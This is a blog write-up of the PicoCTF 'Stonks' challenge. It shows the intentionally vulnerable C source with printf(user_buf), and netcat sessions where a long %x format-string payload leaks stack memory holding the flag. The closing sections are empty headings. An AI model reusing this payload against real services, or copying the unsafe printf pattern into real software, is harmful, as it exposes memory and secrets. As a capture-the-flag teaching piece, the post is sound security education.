---
categories: programming, cybersecurity
date: "2022-07-22T01:00:00Z"
title: 'PicoGym: Stonks writeup and information disclosure'
todo: add LaTeX Tikz images and align* proofs where possible
---

# Capture The Flag

[PicoCTF](https://picoctf.org/) is an annual, Jeapardy-style Capture The Flag
competition dedicated to teaching young cybersecurity enthusiasts about hacking
techniques. Participating in these competitions, even in Pico's backlog of old
challenges, can teach you a lot about:

* binary exploitation/application security,
* network traffic analysis,
* cyber forensics/OSINT techniques,
* cryptography,
* web exploitation, and more.

Because I am a massive nerd and a cybersecurity-conscious programmer, I decided
to tackle some old challenges and see what flags I could capture myself. This
blog post is a writeup for [PicoGym challenge #105:
Stonks](https://play.picoctf.org/practice/challenge/105), a challenge from 2021
involving binary exploitation. I'm really proud of my solution, which is
detailed below.

# Binary exploitation: what is it?

Writing bug-free code is hard. Detecting bugs in code is harder. And finding
exploits for buggy code is even harder than that! The art of [binary
exploitation](https://csea-iitb.github.io/IITBreachers-wiki/2020/07/23/Binary-Exploitation.html),
also known colloquially as "pwning", is the process of discovering and taking
advantage of bugs in programs and weaponizing them to do clever and sometimes
malicious things. The program we will be pwning, `vuln.c`, is available in C
source code, which should make this process significantly easier. Our strategy
is simple:

1. Identify any bugs. We know there is some sort of bug in this code which can
   unveil a flag, but typically when searching for security flaws in low-level
   code this is not a given.
2. Test the behavior of the most interesting bugs. This means tinkering with
   the program in operation to see what behavior comes about in unexpected
   situations.
3. Attempt to abuse security-critical bugs. Writing an actual exploit for
   vulnerable code can be even more difficult than discovering the
   vulnerability in the first place. Lucky for us, the target of our attack has
   not gone to great lengths to protect themself.

# Identifying the bug

Here is the vulnerable code, in full, for you to peruse as you wish. It's about
150 lines of C. Can you detect any suspicious code that could cause a bug? How
about a bug worth exploiting? Since we are trying to reveal a hidden flag of
text which is stored on the endpoint's computer, pay special attention to
places where user interaction could reveal hidden information.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
    int shares;
    char symbol[MAX_SYM_LEN + 1];
    struct Stonks *next;
} Stonk;

typedef struct Portfolios {
    int money;
    Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
    if (!p) {
        return 1;
    }
    printf("\nPortfolio as of ");
    fflush(stdout);
    system("date"); // TODO: implement this in C
    fflush(stdout);

    printf("\n\n");
    Stonk *head = p->head;
    if (!head) {
        printf("You don't own any stonks!\n");
    }
    while (head) {
        printf("%d shares of %s\n", head->shares, head->symbol);
        head = head->next;
    }
    return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
    if (shares < 1) {
        return NULL;
    }
    Stonk *stonk = malloc(sizeof(Stonk));
    stonk->shares = shares;

    int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
    for (int i = 0; i <= MAX_SYM_LEN; i++) {
        if (i < AI_symbol_len) {
            stonk->symbol[i] = 'A' + (rand() % 26);
        } else {
            stonk->symbol[i] = '\0';
        }
    }

    stonk->next = NULL;

    return stonk;
}

int buy_stonks(Portfolio *p) {
    if (!p) {
        return 1;
    }
    char api_buf[FLAG_BUFFER];
    FILE *f = fopen("api","r");
    if (!f) {
        printf("Flag file not found. Contact an admin.\n");
        exit(1);
    }
    fgets(api_buf, FLAG_BUFFER, f);

    int money = p->money;
    int shares = 0;
    Stonk *temp = NULL;
    printf("Using patented AI algorithms to buy stonks\n");
    while (money > 0) {
        shares = (rand() % money) + 1;
        temp = pick_symbol_with_AI(shares);
        temp->next = p->head;
        p->head = temp;
        money -= shares;
    }
    printf("Stonks chosen\n");

    // TODO: Figure out how to read token from file, for now just ask

    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);
    printf("Buying stonks with token:\n");
    printf(user_buf);

    // TODO: Actually use key to interact with API

    view_portfolio(p);

    return 0;
}

Portfolio *initialize_portfolio() {
    Portfolio *p = malloc(sizeof(Portfolio));
    p->money = (rand() % 2018) + 1;
    p->head = NULL;
    return p;
}

void free_portfolio(Portfolio *p) {
    Stonk *current = p->head;
    Stonk *next = NULL;
    while (current) {
        next = current->next;
        free(current);
        current = next;
    }
    free(p);
}

int main(int argc, char *argv[])
{
    setbuf(stdout, NULL);
    srand(time(NULL));
    Portfolio *p = initialize_portfolio();
    if (!p) {
        printf("Memory failure\n");
        exit(1);
    }

    int resp = 0;

    printf("Welcome back to the trading app!\n\n");
    printf("What would you like to do?\n");
    printf("1) Buy some stonks!\n");
    printf("2) View my portfolio\n");
    scanf("%d", &resp);

    if (resp == 1) {
        buy_stonks(p);
    } else if (resp == 2) {
        view_portfolio(p);
    }

    free_portfolio(p);
    printf("Goodbye!\n");

    exit(0);
}
```

You might think that sifting through hundreds of lines of code for a single
exploitable bug must be intensely difficult! And it is. But with the power of
automated tools like debuggers, code linters, and compiler flags, we can
identify many simple mistakes programmatically with no effort on the user's
part. Let's compile this code with the `-Wall` flag enabled, so gcc will warn
us about any obvious problems:

```
[reid@arch ~/Documents/blog/assets]$ gcc -Wall vuln.c 
vuln.c: In function ‘buy_stonks’:
vuln.c:93:2: warning: format not a string literal and no format arguments [-Wformat-security]
   93 |  printf(user_buf);
      |  ^~~~~~
```

gcc's format-security checker has warned us of a potential risk in the
`buy_stonks()` function on line 93, column 2: The `printf` statement's first
argument is the variable `char* user_buf`, and not a pre-set format string. The
surrounding code tells us we are:

1. prompting the user for an "API token",
1. accepting at most 300 characters of input from the user,
2. displaying their input back to them, and...
3. forgetting to use it afterward.

We'll investigate how we can abuse this behavior later.

This information can be identified by automatic security scanning tools like
[SonarQube](https://www.sonarqube.org/),
[BlackDuck](https://www.blackducksoftware.com/), or [Snyk](https://snyk.io/).
Often, CI pipelines will catch bugs before reaching production. However, for
simple bugs like this one, your IDE or LSP may identify the bug the moment it
is written.

# Testing the program's behavior

To reach this line we must navigate a menu defined in `main()` after connecting
to the host with `nc mercury.picoctf.net 27912` and entering `1`. You can do
this yourself in a terminal if you like! Try entering some values and see what
comes out. Here is a sample run:

```
[reid@arch ~/Documents/blog/assets]$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Hello world!
Buying stonks with token:
Hello
Portfolio as of Sun Jul 24 14:25:33 UTC 2022

2 shares of MUNH
6 shares of JD
5 shares of UFF
5 shares of C
4 shares of R
34 shares of U
14 shares of IYN
1 shares of BTVP
2 shares of PLY
52 shares of IP
673 shares of RU
Goodbye!
```

You should notice a seemingly random pile of gibberish coming out
about what stonks you possess. Before continuing with the writeup, try to
answer the following questions:

* Are the outputs deterministic?
* Can we cause a buffer overflow?
* Can the stonks reveal hidden memory contents?
* Are there other red flags our compiler missed?

You tried to investigate all of these questions before continuing, right? Good,
now let's see the solutions.

The answer to the above questions is no, no, I don't know, and no. Actually, on
closer inspection of the stonks shown, we can see they form a linked list of
randomly-generated numbers and strings which do not pull from user input
whatsoever. Since they are generated in `buy_stonks()` with
`pick_symbol_with_AI()` before `scanf()` is called, our only input is the
required `1` to choose to buy stocks. But, hey, what's that up at the top of
`buy_stonks()`, lines 66-72?

```c
char api_buf[FLAG_BUFFER];
FILE *f = fopen("api","r");
if (!f) {
    printf("Flag file not found. Contact an admin.\n");
    exit(1);
}
fgets(api_buf, FLAG_BUFFER, f);
```

Before we populate our stonk portfolio, a *suspicious* file, `api`, is opened
and read into the `api_buf` variable. If we run this program locally `api` will
not be found, and the program will exit here. Since `api_buf` is given the size
of `FLAG_BUFFER` it is fair to assume it contains exactly the flag we are
trying to recover. Unfortunately, these are the only two occurences of the
`api_buf` variable in the entire program. How can we read this variable if it
is not referenced anywhere else in our program?

# Format strings and information disclosure

Every time a function is called, that function's name and arguments are placed
in a stack frame, in approximately that order. `vuln.c`'s fatal flaw is that
the `fgets()` function on line 72 stores the contents of `api`, which is stored
on disk, into a stack variable, `api_buf`. That alone doesn't seem so bad, but
those aren't the only function arguments which rely on stack variables. The
`printf()` function also references stack contents to display text, but it does
so in an awfully insecure way. Rather than calling its arguments by name in its
first argument, the format string, it uses format specifiers like `%s` or `%d`
to pull *directly from stack space* that would normally contain `printf()`'s
arguments.

Normally, the programmer controls the types, values, and quantity of format
specifiers to insert into a format string. However, our compiler only cares
that the first argument is a string. Here are some valid examples of `printf()`
calls:

```c
// Here are some valid uses of printf()

// a string
printf("Hello, %s\n", "Reid Hopkins");

// a decimal integer
printf("The year is %d\n", 2022);

// a "decimal integer"
printf("Hello, %d\n", "Reid Hopkins");

// a string and an unused number
printf("Hello, %s\n", "Reid Hopkins", 2022);

// a "pointer" pointing to nothing
printf("Hello, %p\n");
```

The C language's type checker cannot verify `printf()` statements based on the
values of the format string how many variables should follow it. C's "weak"
typing system is absolutely fine with casting variables by reading their raw
binary values, for better or worse. `printf()`'s extra-flexible approach to
reading inputs allows it to go one step farther and interpret binary data where
further arguments *should* be, even when they do not exist. As previously
mentioned, this behavior can be detected by automated scanners, compiler flags,
or your IDE's language server. Still, this doesn't mean that the bug won't
appear in another form.

# Exploiting `printf()`

Let's look more closely at line 93:

```c
printf(user_buf);
```

The real problem here, as GCC previously identified, is that our user gets to
choose `printf()`'s format string. This means any number of format specifiers
can be included, which will start pulling from stack space looking for more
`printf()` arguments that don't exist. This can be used to disclose the values
of other variables saved in the stack, *including `api_buf`'s contents!*

Let's write our own format string and read some stack contents!

Looking at the program, it looks like we have 300 characters of input to work
with. At two characters per format specifier, we can read about 150 bytes of
memory. Let's compare some potential "sigils" to determine what format
specifier we should use:

* `%s`: this prints "characters" until a null byte is reached. This can get us
  a lot of bang for our buck, right up until we meet an ANSI escape sequence,
  newline character, or other broken output we cannot read. This often ends up
  segfaulting or just quitting out unexpectedly, without giving us the data we
  need. You can try it and see what comes up! The resulting output looks
  similar to what `cat /dev/random` would output. There's not a whole lot of
  ASCII text visible here, probably not what we want.
* `%c`: this prints each byte of memory as a single character. It's less likely
  to break immediately, but still runs into the same problems as printing
  garbage data as strings. What if some useful binary data in the stack is
  found, but we can't read it because it's a non-printable character?
  Ultimately, this is still not the best solution to what we want.
* `%x`: this prints every four bytes (an int) as a hexadecimal number. While it
  may not be readable right away, getting raw hex values from our stack truly
  reveals *everything* our memory has to offer. If a flag appears in our stack,
  we'll have to translate it to text ourselves.

It looks like `%x` is the way to go. Let's try it!

```
[reid@arch ~/Documents/blog]$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x
Buying stonks with token:
8f0e370
Portfolio as of Sat Aug  6 13:58:22 UTC 2022


4 shares of KB
23 shares of HCHX
98 shares of LM
153 shares of W
Goodbye!
```

We've struck gold! `8f0e370` is definitely a hexadecimal number. In UTF-8 that's a "p". Let's fill the other 298 characters of `user_buf` with `%x` format specifiers and see what happens...

```
reid@hp:~/Documents/blog$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x  
Buying stonks with token:
85ea3b0804b00080489c3f7ee3d80ffffffff185e8160f7ef1110f7ee3dc7085e9180685ea39085ea3b06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ffe3007df7f1eaf8f7ef14407222490010f7d80ce9f7ef20c0f7ee35c0f7ee3000ffe3fc48f7d7168df7ee35c08048ecaffe3fc540f7f05f09804b000f7ee3000f7ee3e20ffe3fc88f7f0bd50f7ee489072224900f7ee3000804b000ffe3fc888048c8685e8160ffe3fc74ffe3fc888048be9f7ee33fc0ffe3fd3cffe3fd341185e816072224900ffe3fca000f7d26fa1f7ee3000f7ee30000f7d26fa11ffe3fd34ffe3fd3cffe3fcc410f7ee3000f7f0670af7f1e0000f7ee300000cba5d52fa882533f000180486300f7f0bd50f7f06960804b00018048630080486628048b851ffe3fd348048cd08048d30f7f06960ffe3fd2cf7f1e9401ffe40e790ffe40eb2ffe40ebfffe40ec8ffe40ef7ffe40f2fffe40f4affe40f6bffe40f73020f7ef6b5021f7ef6000101f8bfbff61000116438048034420597f7ef70008098048630b40fc40fd410e41017
Portfolio as of Sat Aug  6 14:09:30 UTC 2022


6 shares of G
167 shares of V
210 shares of ZGVZ
259 shares of IGYN
720 shares of JFF
461 shares of ECFR
Goodbye!
```

Beautiful!

Let's convert this to UTF-8 and see what we get:

# Decrypting our payload
# Flag captured
# The real problem is printf's semantics
# C++'s cout
# Idris: type-safe printf

{% comment %}
TODO: look into dependent types for safe printf (language server can detect
errors based on values before run) and discuss detecting bugs before compile
time
{% endcomment %}

